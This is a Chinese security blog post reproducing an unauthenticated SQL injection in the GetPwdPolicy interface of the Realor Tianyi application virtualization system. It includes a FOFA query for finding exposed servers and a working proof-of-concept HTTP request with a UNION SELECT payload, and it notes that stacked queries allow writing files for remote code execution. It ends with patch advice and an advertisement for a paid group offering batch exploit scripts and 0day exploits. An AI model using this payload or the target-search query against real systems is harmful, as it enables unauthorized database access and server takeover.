#  「漏洞复现」瑞友天翼应用虚拟化系统 GetPwdPolicy SQL注入漏洞   
冷漠安全  冷漠安全   2025-01-11 05:05  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
瑞友天翼应用虚拟化系统是西安瑞友信息技术资讯有限公司研发的具有自主知识产权，基于服务器计算架构的应用虚拟化平台。它将用户各种应用软件集中部署在瑞友天翼服务器(群)上，客户端通过WEB即可快速安全的访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等，从而为用户打造集中、便捷、安全、高效的虚拟化支撑平台。  
  
0x03  
  
漏洞威胁  
  
瑞友天翼应用虚拟化系统中的 GetPwdPolicy 存在无需鉴权SQL注入的风险的接口，攻击者可利用 php PDO默认支持堆叠的方式使用堆叠写入恶意文件导致 RCE。  
  
漏洞成因：  
  
该漏洞是由于系统未对用户的输入进行有效的过滤，直接将其拼接进SQL查询语句中，导致出现了SQL注入漏洞。  
  
漏洞影响：  
  
该漏洞的成功利用可利用SQL注入写入恶意文件获取操作系统权限，最严重的情况下，这可能导致服务器的完全接管，敏感数据泄露，甚至将服务器转化为发起其他攻击的跳板。  
  
0x04  
  
漏洞环境  
  
FOFA:  
```
app="REALOR-天翼应用虚拟化系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p2Mzt9W0TGxicNnQatsRqYy43zkxFAnNCDaCfjTaKgpCnfmnnG7W3cgTiawVibVLib4oQF09Ro78mib1g/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /RAPAgent.XGI?CMD=GetPwdPolicy&User=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7e%2C%28SELECT+user()%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: keep-alive
```  
  
查询当前用户  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p2Mzt9W0TGxicNnQatsRqYyfuliceDAMsFBEs59kGxTsl93zic0bqIQZ45pobgY3UZGD1O3gIf08u1A/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p2Mzt9W0TGxicNnQatsRqYyn1vElFp5TMVMPOFeEqybYRFgBh3KXB9ECMgwTK479mycQ3gz6Z029Q/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
临时缓解方案  
  
加强服务器和应用的访问控制，仅允许可信IP进行访问。另外如非必要，不要将该系统开放在互联网上。  
  
使用WAF等安全设备针对该应用的异常请求进行拦截。  
  
升级修复方案  
  
官方已发布新版本修复漏洞，建议更新至7.0.5.1及以上版本以修复漏洞。  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p2Mzt9W0TGxicNnQatsRqYy1aKGaOC2BGhm7MMHvXsJgvp4TWnE3pIWCYgS56icvIlDia9ezkkAJhAw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0p2Mzt9W0TGxicNnQatsRqYyY5RkocaictoAg8ow0Eic3Q2Z6ibYBYRV30WnTf3kC2ic35GbFowEuOz6jA/640?wx_fmt=gif&from=appmsg "")  
  
  
